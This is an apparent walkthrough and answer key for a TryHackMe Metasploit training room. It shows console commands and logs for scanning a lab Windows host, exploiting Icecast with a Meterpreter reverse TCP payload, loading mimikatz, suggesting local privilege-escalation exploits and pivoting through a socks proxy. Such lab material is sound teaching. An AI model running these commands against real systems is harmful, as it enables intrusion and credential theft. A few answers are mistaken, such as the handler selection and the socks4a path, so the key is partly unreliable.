# Metaspliot

Learn to use Metasploit, a tool to probe and exploit vulnerabilities on networks and servers.

[Metasploit](https://tryhackme.com/room/rpmetasploit)

## Topic's

* Metasploit Fundamentals
* Networking
* Network Enumeration
* Vulnerability Analysis
* Reverse Shell
* Exploitation
* Network Tunneling

## [Task 1] Intro 

Metasploit, an open-source pentesting framework, is a powerful tool utilized by security engineers around the world. Maintained by Rapid 7, Metasploit is a collection of not only thoroughly tested exploits but also auxiliary and post-exploitation tools. Throughout this room, we will explore the basics of using this massive framework and a few of the modules it includes.

The virtual machine used in this room (Ice), a worksheet version of this room, and the subsequent answer key can be downloaded for offline usage from https://darkstar7471.com/resources.html

1. Kali and most other security distributions of Linux include Metasploit by default. If you are using a different distribution of Linux, verify that you have it installed or install it from the Rapid 7 Github repository. 

`No answer needed`

## [Task 2] Initializing... 

If this is your first time using Metasploit, you'll have just a few things to do before you utilize its full functionality. Let's go ahead and get everything started!

1. First things first, we need to initialize the database! Let's do that now with the command: msfdb init

```
kali@kali:~/Downloads/ctf$ sudo msfdb init
[sudo] password for kali: 
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.1/lib/active_record/connection_adapters/abstract_adapter.rb:84: warning: deprecated Object#=~ is called on Integer; it always returns nil
kali@kali:~/Downloads/ctf$
```

`No answer needed`

2. Before starting Metasploit, we can view some of the advanced options we can trigger for starting the console. Check these out now by using the command: msfconsole -h

```
kali@kali:~/Downloads/ctf$ msfconsole -h
Usage: msfconsole [options]

Common options:
    -E, --environment ENVIRONMENT    Set Rails environment, defaults to RAIL_ENV environment variable or 'production'

Database options:
    -M, --migration-path DIRECTORY   Specify a directory containing additional DB migrations
    -n, --no-database                Disable database support
    -y, --yaml PATH                  Specify a YAML file containing database settings

Framework options:
    -c FILE                          Load the specified configuration file
    -v, -V, --version                Show version

Module options:
        --defer-module-loads         Defer module loading unless explicitly asked
    -m, --module-path DIRECTORY      Load an additional module path

Console options:
    -a, --ask                        Ask before exiting Metasploit or accept 'exit -y'
    -H, --history-file FILE          Save command history to the specified file
    -L, --real-readline              Use the system Readline library instead of RbReadline
    -o, --output FILE                Output to the specified file
    -p, --plugin PLUGIN              Load a plugin on startup
    -q, --quiet                      Do not print the banner on startup
    -r, --resource FILE              Execute the specified resource file (- for stdin)
    -x, --execute-command COMMAND    Execute the specified console commands (use ; for multiples)
    -h, --help                       Show this message
```

`No answer needed`

3. We can start the Metasploit console on the command line without showing the banner or any startup information as well. What switch do we add to msfconsole to start it without showing this information? This will include the '-'

`-q`

4. Once the database is initialized, go ahead and start Metasploit via the command: msfconsole

`No answer needed`

5. After Metasploit has started, let's go ahead and check that we've connected to the database. Do this now with the command: db_status

```
msf5 > db_status
[*] Connected to msf. Connection type: postgresql.
```

`No answer needed`

6. Cool! We've connected to the database, which type of database does Metasploit 5 use?

`postgresql`

## [Task 3] Rock 'em to the Core [Commands] 

Using the help menu, let's now learn the base commands and the module categories in Metasploit. Nearly all of the answers to the following questions can be found in the Metasploit help menu.

1. Let's go ahead and start exploring the help menu. On the Metasploit prompt (where we'll be at after we start Metasploit using msfconsole), type the command: help

2. The help menu has a very short one-character alias, what is it?

`?`

3. Finding various modules we have at our disposal within Metasploit is one of the most common commands we will leverage in the framework. What is the base command we use for searching?

`search`

4. Once we've found the module we want to leverage, what command we use to select it as the active module?

`use`

5. How about if we want to view information about either a specific module or just the active one we have selected?

`info`

6. Metasploit has a built-in netcat-like function where we can make a quick connection with a host simply to verify that we can 'talk' to it. What command is this?

`connect`

7. Entirely one of the commands purely utilized for fun, what command displays the motd/ascii art we see when we start msfconsole (without -q flag)?

`banner`

8. We'll revisit these next two commands shortly, however, they're two of the most used commands within Metasploit. First, what command do we use to change the value of a variable?

`set`

9. Metasploit supports the use of global variables, something which is incredibly useful when you're specifically focusing on a single box. What command changes the value of a variable globally?

`setg`

10. Now that we've learned how to change the value of variables, how do we view them? There are technically several answers to this question, however, I'm looking for a specific three-letter command which is used to view the value of single variables.

`get`

11. How about changing the value of a variable to null/no value?

`unset`

12. When performing a penetration test it's quite common to record your screen either for further review or for providing evidence of any actions taken. This is often coupled with the collection of console output to a file as it can be incredibly useful to grep for different pieces of information output to the screen. What command can we use to set our console output to save to a file?

`spool`

13. Leaving a Metasploit console running isn't always convenient and it can be helpful to have all of our previously set values load when starting up Metasploit. What command can we use to store the settings/active datastores from Metasploit to a settings file? This will save within your msf4 (or msf5) directory and can be undone easily by simply removing the created settings file.

`save`

## [Task 4] Modules for Every Occasion! 

Metasploit consists of six core modules that make up the bulk of the tools you will utilize within it. Let's take a quick look through the various modules, their purposes, and some of the commands associated with modules. 

![https://i.imgur.com/iYuiWvP.png](https://i.imgur.com/iYuiWvP.png)

1. Easily the most common module utilized, which module holds all of the exploit code we will use?

`exploit`

2. Used hand in hand with exploits, which module contains the various bits of shellcode we send to have executed following exploitation?

`payload`

3. Which module is most commonly used in scanning and verification machines are exploitable? This is not the same as the actual exploitation of course.

`auxiliary`

4. One of the most common activities after exploitation is looting and pivoting. Which module provides these capabilities?

`Post`

5. Commonly utilized in payload obfuscation, which module allows us to modify the 'appearance' of our exploit such that we may avoid signature detection?

`encoder`

6. Last but not least, which module is used with buffer overflow and ROP attacks?

`nop`

7. Not every module is loaded in by default, what command can we use to load different modules?

`load`

## [Task 5] Move that shell! 

Remember that database we set up? In this step, we're going to take a look at what we can use it for and exploit our victim while we're at it!

As you might have noticed, up until this point we haven't touched nmap in this room, let alone perform much recon on our victim box. That'll all change now as we'll take a swing at using nmap within Metasploit. Go ahead and deploy the box now, it may have up to a three-minute delay for starting up our target vulnerable service.

*Note, Metasploit does support different types of port scans from within the auxiliary modules. Metasploit can also import other scans from nmap and Nessus just to name a few.

1. Metasploit comes with a built-in way to run nmap and feed it's results directly into our database. Let's run that now by using the command 'db_nmap -sV BOX-IP'

```
msf5 > db_nmap -sV 10.10.223.155
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-11 04:57 EDT
[*] Nmap: Nmap scan report for 10.10.223.155
[*] Nmap: Host is up (0.067s latency).
[*] Nmap: Not shown: 988 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: 8000/tcp  open  http               Icecast streaming media server
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49158/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49159/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49160/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 71.23 seconds
```

`No answer needed`

2. What service does nmap identify running on port 135?

`msrpc`

3. Let's go ahead and see what information we have collected in the database. Try typing the command 'hosts' into the msfconsole now.

```
msf5 > hosts

Hosts
=====

address        mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---  ----  -------  ---------  -----  -------  ----  --------
10.10.223.155             Unknown                    device         
```

`No answer needed`

4. How about something else from the database, try the command 'services' now.

```
msf5 > services
Services
========

host           port   proto  name               state  info
----           ----   -----  ----               -----  ----
10.10.223.155  135    tcp    msrpc              open   Microsoft Windows RPC
10.10.223.155  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.10.223.155  445    tcp    microsoft-ds       open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.223.155  3389   tcp    ssl/ms-wbt-server  open   
10.10.223.155  5357   tcp    http               open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.10.223.155  8000   tcp    http               open   Icecast streaming media server
10.10.223.155  49152  tcp    msrpc              open   Microsoft Windows RPC
10.10.223.155  49153  tcp    msrpc              open   Microsoft Windows RPC
10.10.223.155  49154  tcp    msrpc              open   Microsoft Windows RPC
10.10.223.155  49158  tcp    msrpc              open   Microsoft Windows RPC
10.10.223.155  49159  tcp    msrpc              open   Microsoft Windows RPC
10.10.223.155  49160  tcp    msrpc              open   Microsoft Windows RPC
```

`No answar needed`

5. One last thing, try the command 'vulns' now. This won't show much at the current moment, however, it's worth noting that Metasploit will keep track of discovered vulnerabilities. One of the many ways the database can be leveraged quickly and powerfully.

```
msf5 > vulns

Vulnerabilities
===============

Timestamp  Host  Name  References
---------  ----  ----  ----------
```

`No answar needed`

6. Now that we've scanned our victim system, let's try connecting to it with a Metasploit payload. First, we'll have to search for the target payload. In Metasploit 5 (the most recent version at the time of writing) you can simply type 'use' followed by a unique string found within only the target exploit. For example, try this out now with the following command 'use icecast'. What is the full path for our exploit that now appears on the msfconsole prompt? *This will include the exploit section at the start

```
msf5 > use icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


[*] Using exploit/windows/http/icecast_header
```

`exploit/windows/http/icecast_header`

7. While that use command with the unique string can be incredibly useful that's not quite the exploit we want here. Let's now run the command 'search multi/handler'. What is the name of the column on the far left side of the console that shows up next to 'Name'? Go ahead and run the command 'use NUMBER_NEXT_TO exploit/multi/handler` wherein the number will be what appears in that far left column (typically this will be 4 or 5). In this way, we can use our search results without typing out the full name/path of the module we want to use.

```
msf5 exploit(windows/http/icecast_header) > search multi/handler

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
   2  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
   5  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
   6  exploit/multi/handler                                                 manual     No     Generic Payload Handler
   7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
   8  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
```

```
msf5 exploit(windows/http/icecast_header) > use 4 exploit/multi/handler
msf5 exploit(linux/local/desktop_privilege_escalation) >
```

`#`

8. Now type the command 'use NUMBER_FROM_PREVIOUS_QUESTION'. This is the short way to use modules returned by search results.

```
msf5 exploit(linux/local/desktop_privilege_escalation) > use 4
msf5 exploit(linux/local/desktop_privilege_escalation) >
```

`No answer needed`

9. Next, let's set the payload using this command 'set PAYLOAD windows/meterpreter/reverse_tcp'. In this way, we can modify which payloads we want to use with our exploits. Additionally, let's run this command 'set LHOST YOUR_IP_ON_TRYHACKME'. You might have to check your IP using the command 'ip addr', it will likely be your tun0 interface.

```
msf5 exploit(linux/local/desktop_privilege_escalation) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(linux/local/desktop_privilege_escalation) > set LHOST 10.8.106.222
LHOST => 10.8.106.222
msf5 exploit(linux/local/desktop_privilege_escalation) >
```

`No answer needed`

10. Let's go ahead and return to our previous exploit, run the command `use icecast` to select it again.

```
msf5 exploit(linux/local/desktop_privilege_escalation) > use icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


[*] Using exploit/windows/http/icecast_header
```

`No answer needed`

11. One last step before we can run our exploit. Run the command 'set RHOSTS BOX_IP' to tell Metasploit which target to attack.

```
msf5 exploit(windows/http/icecast_header) > set RHOSTS 10.10.223.155
RHOSTS => 10.10.223.155
```

`No answer needed`

12. Once you're set those variables correctly, run the exploit now via either the command 'exploit' or the command 'run -j' to run this as a job.

```
msf5 exploit(windows/http/icecast_header) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.8.106.222:4444 
msf5 exploit(windows/http/icecast_header) > [*] Sending stage (176195 bytes) to 10.10.223.155
[*] Meterpreter session 1 opened (10.8.106.222:4444 -> 10.10.223.155:49293) at 2020-09-11 05:16:03 -0400
msf5 exploit(windows/http/icecast_header) > 
```

`No answer needed`

13. Once we've started this, we can check all of the jobs running on the system by running the command `jobs`

```
msf5 exploit(windows/http/icecast_header) > jobs

Jobs
====

No active jobs.
```

`No answer needed`

14. After we've established our connection in the next task, we can list all of our sessions using the command `sessions`. Similarly, we can interact with a target session using the command `sessions -i SESSION_NUMBER`

```
msf5 exploit(windows/http/icecast_header) > sessions

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.8.106.222:4444 -> 10.10.223.155:49293 (10.10.223.155)
```

```
msf5 exploit(windows/http/icecast_header) > sessions -i 1
[*] Starting interaction with 1...
```

`No answer needed`

## [Task 6] We're in, now what? 

Now that we've got a shell into our victim machine, let's take a look at several post-exploitation modules actions we can leverage! Most of the questions in the following section can be answered by using the Meterpreter help menu which can be accessed through the 'help' command. This menu dynamically expands as we load more modules.

1. First things first, our initial shell/process typically isn't very stable. Let's go ahead and attempt to move to a different process. First, let's list the processes using the command 'ps'. What's the name of the spool service?

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User          Path
 ---   ----  ----                  ----  -------  ----          ----
 0     0     [System Process]                                   
 4     0     System                                             
 416   4     smss.exe                                           
 544   536   csrss.exe                                          
 584   692   svchost.exe                                        
 592   536   wininit.exe                                        
 604   584   csrss.exe                                          
 652   584   winlogon.exe                                       
 692   592   services.exe                                       
 700   592   lsass.exe                                          
 708   592   lsm.exe                                            
 816   692   svchost.exe                                        
 884   692   svchost.exe                                        
 932   692   svchost.exe                                        
 1020  692   svchost.exe                                        
 1056  692   svchost.exe                                        
 1140  692   svchost.exe                                        
 1256  692   spoolsv.exe                                        
 1320  692   svchost.exe                                        
 1400  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
 1508  1020  dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
 1520  1500  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
 1544  816   WmiPrvSE.exe                                       
 1548  692   amazon-ssm-agent.exe                               
 1700  692   LiteAgent.exe                                      
 1740  692   svchost.exe                                        
 1880  692   Ec2Config.exe                                      
 2144  692   svchost.exe                                        
 2264  604   conhost.exe           x64   1                      
 2304  692   sppsvc.exe                                         
 2332  1520  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2456  692   svchost.exe                                        
 2516  692   taskhost.exe          x64   1                      
 2576  692   SearchIndexer.exe                                  
 2728  816   rundll32.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\rundll32.exe
 2736  2516  WinSAT.exe            x64   1                      
 2760  2728  dinotify.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\dinotify.exe
 2972  544   conhost.exe                                        
 3032  1020  Defrag.exe
```

`spoolsv.exe`

2. Let's go ahead and move into the spool process or at least attempt to! What command do we use to transfer ourselves into the process? This won't work at the current time as we don't have sufficient privileges but we can still try!

`migrate`

3. Well that migration didn't work, let's find out some more information about the system so we can try to elevate. What command can we run to find out more information regarding the current user running the process we are in?

```
meterpreter > getuid
Server username: Dark-PC\Dark
```

`getuid`

4. How about finding more information out about the system itself?

```
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

`sysinfo`

5. This might take a little bit of googling, what do we run to load mimikatz (more specifically the new version of mimikatz) so we can use it? 

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success
```

`load kiwi`

6. Let's go ahead and figure out the privileges of our current user, what command do we run?

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

`getprivs`

7. What command do we run to transfer files to our victim computer?

```
meterpreter > upload
Usage: upload [options] src1 src2 src3 ... destination

Uploads local files and directories to the remote machine.

OPTIONS:

    -h        Help banner
    -r        Upload recursively
```

`upload`

8. How about if we want to run a Metasploit module?

```
meterpreter > run
Usage: run <script> [arguments]

Executes a ruby script or Metasploit Post module in the context of the
meterpreter session.  Post modules can take arguments in var=val format.
Example: run post/foo/bar BAZ=abcd
```

`run`

9. A simple question but still quite necessary, what command do we run to figure out the networking information and interfaces on our victim?

```
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 12
============
Name         : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a0a:df9b
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 13
============
Name         : AWS PV Network Device #0
Hardware MAC : 02:14:f8:26:fa:39
MTU          : 9001
IPv4 Address : 10.10.223.155
IPv4 Netmask : 255.255.0.0
IPv6 Address : fe80::7c1b:890e:2266:faba
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

`ipconfig`

10. Let's go ahead and run a few post modules from Metasploit. First, let's run the command `run post/windows/gather/checkvm`. This will determine if we're in a VM, a very useful piece of knowledge for further pivoting.

```
meterpreter > run post/windows/gather/checkvm

[*] Checking if DARK-PC is a Virtual Machine .....
[+] This is a Xen Virtual Machine
```

`No answer needed`

11. Next, let's try: `run post/multi/recon/local_exploit_suggester`. This will check for various exploits which we can run within our session to elevate our privileges. Feel free to experiment using these suggestions, however, we'll be going through this in greater detail in the room `Ice`.

```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.223.155 - Collecting local exploits for x86/windows...
[*] 10.10.223.155 - 30 exploit checks are being tried...
[+] 10.10.223.155 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.223.155 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.223.155 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.223.155 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.223.155 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.223.155 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.223.155 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.223.155 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

`No answer needed`

12. Finally, let's try forcing RDP to be available. This won't work since we aren't administrators, however, this is a fun command to know about: `run post/windows/manage/enable_rdp`

```
meterpreter > run post/windows/manage/enable_rdp

[-] Insufficient privileges, Remote Desktop Service was not modified
[*] For cleanup execute Meterpreter resource file: /home/kali/.msf4/loot/20200911054026_default_10.10.223.155_host.windows.cle_458968.txt
```

`No answer needed`

13. One quick extra question, what command can we run in our meterpreter session to spawn a normal system shell?

`shell`

## [Task 7] Makin' Cisco Proud

Last but certainly not least, let's take a look at the autorouting options available to us in Metasploit. While our victim machine may not have multiple network interfaces (NICs), we'll walk through the motions of pivoting through our victim as if it did have access to extra networks.

1. Let's go ahead and run the command `run autoroute -h`, this will pull up the help menu for autoroute. What command do we run to add a route to the following subnet: 172.18.1.0/24? Use the -n flag in your answer.

```
meterpreter > run autoroute -h

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Usage:   run autoroute [-r] -s subnet -n netmask
[*] Examples:
[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
[*]   run autoroute -p                            # Print active routing table
[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
[*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module
```

`run autoroute -s 172.18.1.0 -n 255.255.255.0`

2. Additionally, we can start a socks4a proxy server out of this session. Background our current meterpreter session and run the command `search server/socks4a`. What is the full path to the socks4a auxiliary module?

```
msf5 exploit(windows/http/icecast_header) > search server/socks4a

Matching Modules
================

   #  Name                      Disclosure Date  Rank    Check  Description
   -  ----                      ---------------  ----    -----  -----------
   0  auxiliary/server/socks4a                   normal  No     Socks4a Proxy Server
```

`search server/socks4a`

3. Once we've started a socks server we can modify our /etc/proxychains.conf file to include our new server. What command do we prefix our commands (outside of Metasploit) to run them through our socks4a server with proxychains?

```
msf5 exploit(windows/http/icecast_header) > proxychains
[*] exec: proxychains

ProxyChains-3.1 (http://proxychains.sf.net)
        usage:
                proxychains <prog> [args]
```

`proxychains`
